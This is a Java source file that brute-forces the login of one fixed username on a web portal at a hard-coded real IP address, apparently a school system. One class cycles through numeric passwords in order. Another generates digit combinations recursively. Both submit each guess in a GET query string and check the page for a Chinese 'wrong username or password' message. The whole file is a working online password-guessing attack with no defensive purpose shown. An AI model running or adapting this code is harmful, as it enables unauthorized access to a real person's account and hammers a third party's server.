package com.zhc.u.demo.test2;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class b {
    public static void main(String[] args) throws IOException {
        b b = new b();
        for (long i = 0;  i < 99999999999999999L; i++) {
            if (b.login(String.valueOf(i)) == 0) {
                System.out.println("s: " + i);
                System.exit(1);
            }
            if (i % 100L == 0) {
                System.out.println(i);
            }
        }
    }

    public int login(String pw) throws IOException {
        int a = 0;
        String un = "201711010";
        URL u = new URL("http://218.4.55.34/index.aspx?__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUKMTgxNjY0ODgxMQ9kFgIC" +
                "Aw9kFg4CBQ8PFgIeBFRleHQFZ%2BaCqOS4iuasoeS4jeaYr%2BS7jui%2FmeWPsOeUteiEkeeZu%2BW9leWtpuS5oOW5s%" +
                "2BWPsD88YnIvPumaj%2BaEj%2BaNouacuuS8mue7meS7luS6uuW4puadpeS4jeS%2Bv%2B%2B8jOivt%2BeQhuinoyFkZAIHDw" +
                "9kFgIeB29uQ2xpY2sFFHJldHVybiBkb3VibGVDaGVjaygpZAITDw8WAh8ABRLjgI7kuKrkurrmqKHlvI%2FjgI9kZAIXDw8WAh8A" +
                "BQs0OS43Mi4yOS45NGRkAhkPDxYCHwAFCzQ5LjcyLjI5Ljk0ZGQCGw8PFgIfAAUBMmRkAh0PDxYCHwAFR0lQ77yaMS4wM" +
                "DAx5q%2Br56eSJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A75Li75py65ZCN77yaMy4wMDAx5q%2Br56eSJm5ic3A7ZGRkF3JYCH0" +
                "2tV3w2%2BN5ex4LpVjOfbY%3D&__VIEWSTATEGENERATOR=90059987&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDA" +
                "TION=%2FwEWBAKYv5f5AQKYpfGYCALw08i7DQLi44fLCXFaEL8Y0Mjn6gRqBNqsg8FvJaAL&TextBoxuser=" + un +
                "&TextBoxpwd=" + pw + "&Btnlogin=%E7%99%BB%E5%BD%95");
        InputStream is = u.openStream();
        InputStreamReader isr = new InputStreamReader(is, StandardCharsets.UTF_8);
        BufferedReader br = new BufferedReader(isr);
        String r = br.readLine();
        while (r != null) {
            if (r.matches(".*id=\"Labelmsg\".*")) {
//                System.out.print(r);
                if (r.matches(".*用户名或密码错误.*")) {
                    a = -1;
                }
            }
            r = br.readLine();
        }
        return a;
    }
}

class s2 {
    private static int i = 0;
    public static void main(String[] args) throws IOException {
        //定义数组
        String[] strs={"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
                /*, "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","com.zhc.u","v","w","x","y","z"*/};
        //定义随机组合最多位数
//        int size=5;
//        eachStr(size,strs);//调用
        for (int i = 1; i < 100; i++) {
            new s2().eachStr(i,strs);//调用
        }
    }

    public void pintStr(int num,String[] strs,String beforeStr,String beforeChar) throws IOException {
        num--;
        for (String str : strs) {
            if (str.equals(beforeChar)) {
                continue;
            }
            if (num == 0) {
                String pw =  (beforeStr == null ? "" : beforeStr) + str;
                int r = new b().login(pw);
                i++;
                if (i == 100) {
                    System.out.println(pw);
                    i = 0;
                }
                if (r == 0) {
                    System.out.println("success: " + pw);
                    System.exit(1);
                }
            } else {
                pintStr(num, strs, (beforeStr == null ? "" : beforeStr) + str, str);
            }
        }
    }
    public void eachStr(int num,String[] strs) throws IOException {
        while (num>0) {
            pintStr(num, strs, null,null);
            num--;
        }
    }
}